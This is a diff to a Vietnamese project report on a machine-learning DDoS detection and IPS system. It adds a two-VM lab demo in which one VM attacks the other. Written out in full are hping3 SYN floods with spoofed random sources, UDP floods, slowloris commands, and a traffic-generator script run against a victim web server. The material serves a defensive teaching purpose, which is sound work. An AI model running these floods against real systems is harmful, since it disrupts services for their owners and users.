@@ -348,13 +348,23 @@ Hậu quả: mô hình học phân phối train nhưng test có phân phối kh�
 
 **VM 1 — Attacker** (Kali Linux hoặc Ubuntu):
 ```bash
+# Cài đặt công cụ
+sudo apt update && sudo apt install -y hping3 python3-pip
 pip install scapy
-# Hoặc cài hping3:
-sudo apt install hping3
+
+# (Tùy chọn) Cài slowloris nếu muốn test riêng:
+pip install slowloris
 ```
 
 **VM 2 — Victim** (Ubuntu):
 ```bash
+# Cài Apache2 làm web server mục tiêu
+sudo apt update && sudo apt install -y apache2
+sudo systemctl start apache2
+
+# Cài công cụ giám sát
+sudo apt install -y htop tcpdump wireshark-common tshark
+
 # Clone project và cài đặt
 git clone https://github.com/ShirokaitoX1412/mlddos.git
 cd mlddos
@@ -372,40 +382,84 @@ PYTHONPATH=backend/src python -m ml_ddos.main --combine-resplit --cv-folds 3 --s
 
 #### 8.1.3. Các kịch bản tấn công DDoS
 
-| # | Kịch bản | Loại tấn công | Mô tả |
-|---|----------|---------------|-------|
-| 1 | Baseline | Benign | Lưu lượng bình thường (HTTP, ICMP, DNS) |
-| 2 | TCP SYN Flood | Volumetric | Gửi hàng loạt gói SYN làm cạn bảng kết nối |
-| 3 | UDP Flood | Volumetric | Gửi lượng lớn gói UDP nhỏ gây quá tải |
-| 4 | UDP-Lag Flood | Volumetric | Gửi gói UDP lớn (1400 bytes) gây trễ xử lý |
-| 5 | LDAP Flood | Amplification | Traffic giả lập phản hồi LDAP (port 389) |
-| 6 | MSSQL Flood | Amplification | Traffic giả lập phản hồi MSSQL (port 1434) |
-| 7 | NetBIOS Flood | Amplification | Traffic giả lập NetBIOS query (port 137) |
+| # | Kịch bản | Tầng | Loại tấn công | Mô tả |
+|---|----------|------|---------------|-------|
+| 1 | Baseline | — | Benign | Lưu lượng bình thường (HTTP, ICMP, DNS) |
+| 2 | TCP SYN Flood | Layer 4 | Volumetric | Gửi hàng loạt gói SYN từ IP thật |
+| **3** | **SYN Flood + IP Spoofing** | **Layer 4** | **Volumetric** | **Gói SYN với IP nguồn giả mạo (như hping3 --rand-source) — làm tràn state table** |
+| 4 | UDP Flood | Layer 4 | Volumetric | Gửi lượng lớn gói UDP nhỏ gây quá tải |
+| 5 | UDP-Lag Flood | Layer 4 | Volumetric | Gửi gói UDP lớn (1400 bytes) gây trễ xử lý |
+| 6 | LDAP Flood | Layer 4 | Amplification | Traffic giả lập phản hồi LDAP (port 389) |
+| 7 | MSSQL Flood | Layer 4 | Amplification | Traffic giả lập phản hồi MSSQL (port 1434) |
+| 8 | NetBIOS Flood | Layer 4 | Amplification | Traffic giả lập NetBIOS query (port 137) |
+| **9** | **Slowloris** | **Layer 7** | **Application** | **Giữ kết nối HTTP mở lâu, vắt kiệt connection pool của web server** |
+
+> **Lưu ý về Slowloris**: Model được train trên CICDDoS2019 **không có class Slowloris**. Model có thể phân loại traffic này thành TCP SYN Flood hoặc Benign — đây là hạn chế đáng ghi nhận trong báo cáo.
 
 #### 8.1.4. Thực hiện demo
 
-**Bước 1 — Khởi chạy IDS/IPS trên VM Victim (Terminal 1):**
+**Bước 1 — Khởi chạy dịch vụ web trên VM Victim:**
+```bash
+# Kiểm tra Apache đang chạy
+sudo systemctl status apache2
+# Nếu chưa chạy:
+sudo systemctl start apache2
+# Kiểm tra: mở trình duyệt vào http://192.168.56.102 — phải thấy trang Apache mặc định
+```
+
+**Bước 2 — Khởi chạy IDS/IPS trên VM Victim (Terminal 1):**
 ```bash
 cd mlddos
 source venv/bin/activate
 
 # Chế độ mô phỏng (an toàn — chỉ ghi log, không chặn IP thật)
-sudo PYTHONPATH=backend/src python -m ml_ddos.live_ips -i eth0
+sudo PYTHONPATH=backend/src python -m ml_ddos.live_ips -i enp0s8
 
 # Chế độ IPS thật (CÓ chặn IP bằng iptables)
-sudo PYTHONPATH=backend/src python -m ml_ddos.live_ips -i eth0 --live
+sudo PYTHONPATH=backend/src python -m ml_ddos.live_ips -i enp0s8 --live
+```
+> Lưu ý: thay `enp0s8` bằng tên card mạng Host-Only của VM (`ip addr` để xem).
+
+**Bước 3 — (Tùy chọn) Bật giám sát trên VM Victim (Terminal 2 + 3):**
+```bash
+# Terminal 2: Giám sát tài nguyên CPU/RAM
+htop
+
+# Terminal 3: Bắt gói tin (PCAP) để phân tích sau
+sudo tcpdump -i enp0s8 -w ~/ddos_demo_$(date +%Y%m%d_%H%M%S).pcap
+# Ctrl+C để dừng sau khi demo xong
 ```
 
-**Bước 2 — (Tùy chọn) Khởi chạy Dashboard trên VM Victim (Terminal 2):**
+**Bước 4 — (Tùy chọn) Khởi chạy Dashboard trên VM Victim (Terminal 4):**
 ```bash
 cd mlddos && source venv/bin/activate
 streamlit run frontend/app.py
 # Mở: http://192.168.56.102:8501
 ```
 
-**Bước 3 — Sinh traffic tấn công từ VM Attacker:**
+**Bước 5 — Sinh traffic tấn công từ VM Attacker:**
 
-Cách 1 — Dùng script tự động (Scapy):
+**Kịch bản A — SYN Flood với IP Spoofing (Layer 4):**
+```bash
+# Cách 1: Dùng hping3 (khuyến nghị)
+sudo hping3 -S --flood -V -p 80 --rand-source 192.168.56.102
+# -S: Cờ SYN | --flood: Tốc độ tối đa | --rand-source: IP giả mạo
+
+# Cách 2: Dùng script (tùy chỉnh được PPS)
+sudo python3 tools/ddos_traffic_generator.py --target 192.168.56.102 --attack syn_spoof -d 60 --pps 200
+```
+
+**Kịch bản B — Slowloris (Layer 7):**
+```bash
+# Cách 1: Dùng script tích hợp
+sudo python3 tools/ddos_traffic_generator.py --target 192.168.56.102 --attack slowloris -d 120 --pps 200
+# Mở 200 kết nối HTTP và giữ mở trong 120 giây
+
+# Cách 2: Dùng công cụ slowloris riêng
+slowloris 192.168.56.102 -s 500
+```
+
+**Các kịch bản khác (CICDDoS2019 attack types):**
 ```bash
 # Chạy từng kịch bản riêng lẻ:
 sudo python3 tools/ddos_traffic_generator.py --target 192.168.56.102 --attack syn_flood -d 30
@@ -415,14 +469,17 @@ sudo python3 tools/ddos_traffic_generator.py --target 192.168.56.102 --attack ld
 sudo python3 tools/ddos_traffic_generator.py --target 192.168.56.102 --attack mssql_flood -d 30
 sudo python3 tools/ddos_traffic_generator.py --target 192.168.56.102 --attack netbios_flood -d 30
 
-# Chạy TẤT CẢ kịch bản liên tiếp (30s mỗi loại):
-sudo python3 tools/ddos_traffic_generator.py --target 192.168.56.102 --attack all -d 210
+# Chạy TẤT CẢ kịch bản liên tiếp (9 kịch bản, ~30s mỗi loại):
+sudo python3 tools/ddos_traffic_generator.py --target 192.168.56.102 --attack all -d 270
 ```
 
-Cách 2 — Dùng hping3 (thủ công):
+**Dùng hping3 (thủ công):**
 ```bash
-# TCP SYN Flood
+# TCP SYN Flood (IP thật)
 sudo hping3 -S --flood -p 80 192.168.56.102
+
+# TCP SYN Flood + IP Spoofing
+sudo hping3 -S --flood -V -p 80 --rand-source 192.168.56.102
 
 # UDP Flood
 sudo hping3 --udp --flood -p 53 192.168.56.102
@@ -431,18 +488,53 @@ sudo hping3 --udp --flood -p 53 192.168.56.102
 sudo hping3 --udp --flood -d 1400 -p 80 192.168.56.102
 ```
 
-#### 8.1.5. Kết quả
+#### 8.1.5. Theo dõi và thu thập kết quả
+
+**Trên VM Victim — Quan sát hiệu ứng tấn công:**
+
+| Công cụ | Mục đích | Lệnh |
+|---------|---------|------|
+| **IDS/IPS console** | Xem phân loại real-time | Đã chạy ở Bước 2 |
+| **htop** | Xem CPU/RAM nhảy lên khi bị tấn công | `htop` |
+| **tcpdump** | Bắt PCAP để phân tích sau | `sudo tcpdump -i enp0s8 -w ddos_demo.pcap` |
+| **Wireshark** | Phân tích PCAP trực quan | Mở file `.pcap` trong Wireshark |
+| **curl / trình duyệt** | Kiểm tra dịch vụ còn hoạt động | `curl http://192.168.56.102` liên tục |
+| **ping** | Kiểm tra kết nối | `ping 192.168.56.102` từ host |
+
+**Trình tự quan sát để trình bày:**
+1. Trước tấn công: `curl` vào Apache → phản hồi bình thường, IDS log "Benign"
+2. Bắt đầu tấn công: `htop` thấy CPU tăng, IDS log "TCP SYN Flood (95%)"
+3. Sau vài giây: `curl` timeout hoặc chậm rõ rệt → chứng minh DDoS hiệu quả
+4. IPS chặn IP: IDS log "[IPS] Blocking x.x.x.x" → dịch vụ phục hồi
+
+**Phân tích PCAP sau demo:**
+```bash
+# Thống kê protocol trong file PCAP
+tshark -r ddos_demo.pcap -q -z io,phs
+
+# Lọc chỉ gói SYN
+tshark -r ddos_demo.pcap -Y "tcp.flags.syn==1 && tcp.flags.ack==0"
+
+# Đếm số gói theo IP nguồn (phát hiện IP Spoofing)
+tshark -r ddos_demo.pcap -T fields -e ip.src | sort | uniq -c | sort -rn | head -20
+```
+
+> File PCAP có thể dùng làm dữ liệu đầu vào thực tế cho các thuật toán phân loại và phát hiện dị thường.
+
+#### 8.1.6. Kết quả
 
 - **Console VM Victim**: Hiển thị log real-time — mỗi flow được phân loại (Benign / loại tấn công) kèm confidence.
 - **File log**: `results/live_events.csv` — ghi lại toàn bộ events.
+- **File PCAP**: `ddos_demo_*.pcap` — dữ liệu gói tin để phân tích trong Wireshark.
 - **Dashboard**: Biểu đồ cập nhật trực tiếp (nếu đã chạy Streamlit).
 - **Chặn IP** (chế độ `--live`): Tự động thêm rule `iptables -A INPUT -s <IP> -j DROP`.
 
-#### 8.1.6. Lưu ý an toàn
+#### 8.1.7. Lưu ý an toàn
 
 - **Chỉ chạy trên mạng lab cô lập** (host-only / internal network).
 - Chế độ mặc định là **SIMULATION** — chỉ ghi log, không thực thi iptables.
 - Flag `--live` sẽ chặn IP thật — chỉ dùng trên VM lab.
+- `--rand-source` / `syn_spoof` gửi gói với IP giả mạo — không dùng ngoài mạng lab.
 
 ### 8.2. Replay IDS (Demo offline — không cần card mạng)
 
@@ -574,11 +666,18 @@ $env:PYTHONPATH="backend\src"; python -m ml_ddos.replay_ips --model selected_mod
 Xem chi tiết tại [Mục 8.1](#81-demo-2-máy-ảo--phát-hiện-ddos-thời-gian-thực).
 
 ```bash
-# VM Victim — chạy IDS/IPS
-sudo PYTHONPATH=backend/src python -m ml_ddos.live_ips -i eth0
+# VM Victim — chạy Apache + IDS/IPS
+sudo systemctl start apache2
+sudo PYTHONPATH=backend/src python -m ml_ddos.live_ips -i enp0s8
 
-# VM Attacker — sinh traffic tấn công
-sudo python3 tools/ddos_traffic_generator.py --target <VICTIM_IP> --attack all -d 210
+# VM Attacker — Kịch bản A: SYN Flood + IP Spoofing
+sudo hping3 -S --flood -V -p 80 --rand-source <VICTIM_IP>
+
+# VM Attacker — Kịch bản B: Slowloris
+sudo python3 tools/ddos_traffic_generator.py --target <VICTIM_IP> --attack slowloris -d 120
+
+# VM Attacker — Tất cả kịch bản liên tiếp
+sudo python3 tools/ddos_traffic_generator.py --target <VICTIM_IP> --attack all -d 270
 ```
 
 ---
@@ -592,6 +691,7 @@ sudo python3 tools/ddos_traffic_generator.py --target <VICTIM_IP> --attack all -
 3. **Chưa kiểm thử trên traffic thật**: Hệ thống chỉ được đánh giá trên CICDDoS2019, cần thêm đánh giá trên dữ liệu thực tế từ mạng campus/enterprise.
 4. **Thời gian phân loại**: Pipeline hiện tại chưa tối ưu cho real-time với lượng flow lớn (> 10.000 flow/s).
 5. **Traffic generator đơn giản**: Script sinh traffic dùng Scapy/hping3 chỉ mô phỏng pattern cơ bản, chưa tái tạo đúng đặc điểm phức tạp của các cuộc tấn công thực tế.
+6. **Không có class Slowloris trong dataset**: CICDDoS2019 không chứa mẫu Slowloris nên model không phân loại được chính xác loại tấn công này.
 
 ### 10.2. Hướng phát triển
 
@@ -601,6 +701,7 @@ sudo python3 tools/ddos_traffic_generator.py --target <VICTIM_IP> --attack all -
 4. **Alerting**: Tích hợp cảnh báo Telegram/Email khi phát hiện tấn công.
 5. **Mở rộng dataset**: Kết hợp thêm CIC-IDS2017, UNSW-NB15 để tăng đa dạng attack patterns.
 6. **Deep Learning**: Thử nghiệm LSTM/CNN trên time-series flow features.
+7. **Mở rộng loại tấn công**: Thêm dữ liệu Slowloris, HTTP Flood, DNS Amplification vào tập huấn luyện để mở rộng khả năng phân loại.
 
 ---
 
@@ -611,7 +712,7 @@ sudo python3 tools/ddos_traffic_generator.py --target <VICTIM_IP> --attack all -
 - **Pipeline ML hoàn chỉnh**: Từ nạp dữ liệu, tiền xử lý (leakage-safe), huấn luyện với cross-validation, đến đánh giá và lưu mô hình.
 - **Xử lý vấn đề distribution shift**: Phương pháp Combine & Re-split đã loại bỏ hoàn toàn hiện tượng overfitting do source-based split của CICDDoS2019, nâng Test Macro F1 từ 0,677 lên 0,939.
 - **Mô hình đạt hiệu suất cao**: XGBoost đạt Accuracy 97,56%, Macro F1 93,86%, với Train/Test Gap chỉ 0,21%.
-- **Demo 2 máy ảo**: VM Attacker sinh traffic DDoS (7 kịch bản), VM Victim chạy IDS/IPS phân loại thời gian thực bằng Scapy, features khớp 100% với training data.
-- **Nhiều hình thức demo**: Demo 2 VM thời gian thực, Replay offline, Dashboard Streamlit.
+- **Demo 2 máy ảo**: VM Attacker sinh traffic DDoS (9 kịch bản bao gồm SYN Flood + IP Spoofing và Slowloris), VM Victim chạy IDS/IPS phân loại thời gian thực bằng Scapy, features khớp 100% với training data.
+- **Nhiều hình thức demo**: Demo 2 VM thời gian thực (Layer 4 + Layer 7), Replay offline, Dashboard Streamlit.
 
 Hệ thống có ý nghĩa thực tiễn trong việc hỗ trợ quản trị viên mạng phát hiện sớm các cuộc tấn công DDoS. Hướng phát triển tiếp theo bao gồm triển khai trên SDN controller để tự động chặn tấn công bằng flow rules và kiểm thử trên traffic mạng thực tế.
